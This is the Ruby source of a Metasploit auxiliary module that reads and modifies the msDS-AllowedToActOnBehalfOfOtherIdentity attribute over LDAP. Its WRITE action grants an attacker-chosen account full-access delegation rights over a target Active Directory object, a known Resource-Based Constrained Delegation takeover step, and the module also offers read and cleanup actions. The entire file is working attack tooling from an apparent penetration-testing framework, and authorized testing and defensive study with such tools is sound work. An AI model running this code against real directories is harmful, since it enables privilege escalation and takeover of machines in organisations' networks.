##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::LDAP

  ATTRIBUTE = 'msDS-AllowedToActOnBehalfOfOtherIdentity'.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Role Base Constrained Delegation',
        'Description' => %q{
          This module can read and write the necessary LDAP attributes to configure a particular object for Role Based
          Constrained Delegation (RBCD). When writing, the module will add an access control entry to allow the account
          specified in DELEGATE_FROM to the object specified in DELEGATE_TO. In order for this to succeed, the
          authenticated user must have write access to the target object (the object specified in DELEGATE_TO).
        },
        'Author' => [
          'Podalirius', # Remi Gascou (@podalirius_), Impacket reference implementation
          'Charlie Bromberg', # Charlie Bromberg (@_nwodtuhs), Impacket reference implementation
          'Spencer McIntyre' # module author
        ],
        'References' => [
          ['URL', 'https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution'],
          ['URL', 'https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd'],
          ['URL', 'https://github.com/SecureAuthCorp/impacket/blob/3c6713e309cae871d685fa443d3e21b7026a2155/examples/rbcd.py']
        ],
        'License' => MSF_LICENSE,
        'Actions' => [
          ['FLUSH', { 'Description' => 'Delete the security descriptor' }],
          ['READ', { 'Description' => 'Read the security descriptor' }],
          ['REMOVE', { 'Description' => 'Remove matching ACEs from the security descriptor DACL' }],
          ['WRITE', { 'Description' => 'Add an ACE to the security descriptor DACL' }]
        ],
        'DefaultAction' => 'READ',
        'Notes' => {
          'Stability' => [],
          'SideEffects' => [CONFIG_CHANGES], # REMOVE, FLUSH, WRITE all make changes
          'Reliability' => []
        }
      )
    )

    register_options([
      OptString.new('DELEGATE_TO', [ true, 'The delegation target' ]),
      OptString.new('DELEGATE_FROM', [ false, 'The delegation source' ])
    ])
  end

  def build_ace(sid)
    Rex::Proto::MsDtyp::MsDtypAce.new({
      header: {
        ace_type: Rex::Proto::MsDtyp::MsDtypAceType::ACCESS_ALLOWED_ACE_TYPE
      },
      body: {
        access_mask: Rex::Proto::MsDtyp::MsDtypAccessMask::ALL,
        sid: sid
      }
    })
  end

  def fail_with_ldap_error(message)
    ldap_result = @ldap.get_operation_result.table
    return if ldap_result[:code] == 0

    print_error(message)
    # Codes taken from https://ldap.com/ldap-result-code-reference-core-ldapv3-result-codes
    case ldap_result[:code]
    when 1
      fail_with(Failure::Unknown, "An LDAP operational error occurred. The error was: #{ldap_result[:error_message].strip}")
    when 16
      fail_with(Failure::NotFound, 'The LDAP operation failed because the referenced attribute does not exist.')
    when 50
      fail_with(Failure::NoAccess, 'The LDAP operation failed due to insufficient access rights.')
    when 51
      fail_with(Failure::UnexpectedReply, 'The LDAP operation failed because the server is too busy to perform the request.')
    when 52
      fail_with(Failure::UnexpectedReply, 'The LDAP operation failed because the server is not currently available to process the request.')
    when 53
      fail_with(Failure::UnexpectedReply, 'The LDAP operation failed because the server is unwilling to perform the request.')
    when 64
      fail_with(Failure::Unknown, 'The LDAP operation failed due to a naming violation.')
    when 65
      fail_with(Failure::Unknown, 'The LDAP operation failed due to an object class violation.')
    end

    fail_with(Failure::Unknown, "Unknown LDAP error occurred: result: #{ldap_result[:code]} message: #{ldap_result[:error_message].strip}")
  end

  def get_delegate_from_obj
    delegate_from = datastore['DELEGATE_FROM']
    if delegate_from.blank?
      fail_with(Failure::BadConfig, 'The DELEGATE_FROM option must be specified for this action.')
    end

    obj = ldap_get("(sAMAccountName=#{delegate_from})", attributes: ['sAMAccountName', 'ObjectSID'])
    if obj.nil? && !delegate_from.end_with?('$')
      obj = ldap_get("(sAMAccountName=#{delegate_from}$)", attributes: ['sAMAccountName', 'ObjectSID'])
    end
    fail_with(Failure::NotFound, "Failed to find sAMAccountName: #{delegate_from}") unless obj

    obj
  end

  def ldap_get(filter, attributes: [])
    raw_obj = @ldap.search(base: @base_dn, filter: filter, attributes: attributes).first
    return nil unless raw_obj

    obj = {}

    obj['dn'] = raw_obj['dn'].first.to_s
    unless raw_obj['sAMAccountName'].empty?
      obj['sAMAccountName'] = raw_obj['sAMAccountName'].first.to_s
    end

    unless raw_obj['ObjectSid'].empty?
      obj['ObjectSid'] = Rex::Proto::MsDtyp::MsDtypSid.read(raw_obj['ObjectSid'].first)
    end

    unless raw_obj[ATTRIBUTE].empty?
      obj[ATTRIBUTE] = Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.read(raw_obj[ATTRIBUTE].first)
    end

    obj
  end

  def run
    ldap_connect do |ldap|
      validate_bind_success!(ldap)

      if (@base_dn = datastore['BASE_DN'])
        print_status("User-specified base DN: #{@base_dn}")
      else
        print_status('Discovering base DN automatically')

        unless (@base_dn = discover_base_dn(ldap))
          print_warning("Couldn't discover base DN!")
        end
      end
      @ldap = ldap

      delegate_to = datastore['DELEGATE_TO']
      obj = ldap_get("(sAMAccountName=#{delegate_to})", attributes: ['sAMAccountName', 'ObjectSID', ATTRIBUTE])
      if obj.nil? && !delegate_to.end_with?('$')
        obj = ldap_get("(sAMAccountName=#{delegate_to}$)", attributes: ['sAMAccountName', 'ObjectSID', ATTRIBUTE])
      end
      fail_with(Failure::NotFound, "Failed to find sAMAccountName: #{delegate_to}") unless obj

      send("action_#{action.name.downcase}", obj)
    end
  rescue Net::LDAP::Error => e
    print_error("#{e.class}: #{e.message}")
  end

  def action_read(obj)
    security_descriptor = obj[ATTRIBUTE]
    if security_descriptor.nil?
      print_status('The msDS-AllowedToActOnBehalfOfOtherIdentity field is empty.')
      return
    end

    if security_descriptor.dacl.nil?
      print_status('The msDS-AllowedToActOnBehalfOfOtherIdentity DACL field is empty.')
      return
    end

    print_status('Allowed accounts:')
    security_descriptor.dacl.aces.each do |ace|
      account_name = ldap_get("(ObjectSid=#{ace.body.sid})", attributes: ['sAMAccountName'])
      if account_name
        print_status("  #{ace.body.sid} (#{account_name['sAMAccountName']})")
      else
        print_status("  #{ace.body.sid}")
      end
    end
  end

  def action_remove(obj)
    delegate_from = get_delegate_from_obj

    security_descriptor = obj[ATTRIBUTE]
    unless security_descriptor.dacl && !security_descriptor.dacl.aces.empty?
      print_status('No DACL ACEs are present. No changes are necessary.')
      return
    end

    aces = security_descriptor.dacl.aces.snapshot
    aces.delete_if { |ace| ace.body[:sid] == delegate_from['ObjectSid'] }
    delta = security_descriptor.dacl.aces.length - aces.length
    if delta == 0
      print_status('No DACL ACEs matched. No changes are necessary.')
      return
    else
      print_status("Removed #{delta} matching ACE#{delta > 1 ? 's' : ''}.")
    end
    security_descriptor.dacl.aces = aces
    # clear these fields so they'll be calculated automatically after the update
    security_descriptor.dacl.acl_count.clear
    security_descriptor.dacl.acl_size.clear

    unless @ldap.replace_attribute(obj['dn'], ATTRIBUTE, security_descriptor.to_binary_s)
      fail_with_ldap_error('Failed to update the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
    end
    print_good('Successfully updated the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
  end

  def action_flush(obj)
    unless obj[ATTRIBUTE]
      print_status('The msDS-AllowedToActOnBehalfOfOtherIdentity field is empty. No changes are necessary.')
      return
    end

    unless @ldap.delete_attribute(obj['dn'], ATTRIBUTE)
      fail_with_ldap_error('Failed to deleted the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
    end

    print_good('Successfully deleted the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
  end

  def action_write(obj)
    delegate_from = get_delegate_from_obj
    if obj[ATTRIBUTE]
      _action_write_update(obj, delegate_from)
    else
      _action_write_create(obj, delegate_from)
    end
  end

  def _action_write_create(obj, delegate_from)
    security_descriptor = Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.new
    security_descriptor.owner_sid = Rex::Proto::MsDtyp::MsDtypSid.new('S-1-5-32-544')
    security_descriptor.dacl = Rex::Proto::MsDtyp::MsDtypAcl.new
    security_descriptor.dacl.acl_revision = Rex::Proto::MsDtyp::MsDtypAcl::ACL_REVISION_DS
    security_descriptor.dacl.aces << build_ace(delegate_from['ObjectSid'])

    unless @ldap.add_attribute(obj['dn'], ATTRIBUTE, security_descriptor.to_binary_s)
      fail_with_ldap_error('Failed to create the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
    end

    print_good('Successfully created the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
    print_status('Added account:')
    print_status("  #{delegate_from['ObjectSid']} (#{delegate_from['sAMAccountName']})")
  end

  def _action_write_update(obj, delegate_from)
    security_descriptor = obj[ATTRIBUTE]
    if security_descriptor.dacl
      if security_descriptor.dacl.aces.any? { |ace| ace.body[:sid].to_s == delegate_from['ObjectSid'].to_s }
        print_status("Delegation from #{delegate_from['sAMAccountName']} to #{obj['sAMAccountName']} is already enabled.")
      end
      # clear these fields so they'll be calculated automatically after the update
      security_descriptor.dacl.acl_count.clear
      security_descriptor.dacl.acl_size.clear
    else
      security_descriptor.control.dp = 1
      security_descriptor.dacl = Rex::Proto::MsDtyp::MsDtypAcl.new
      security_descriptor.dacl.acl_revision = Rex::Proto::MsDtyp::MsDtypAcl::ACL_REVISION_DS
    end

    security_descriptor.dacl.aces << build_ace(delegate_from['ObjectSid'])

    unless @ldap.replace_attribute(obj['dn'], ATTRIBUTE, security_descriptor.to_binary_s)
      fail_with_ldap_error('Failed to update the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
    end

    print_good('Successfully updated the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
  end
end
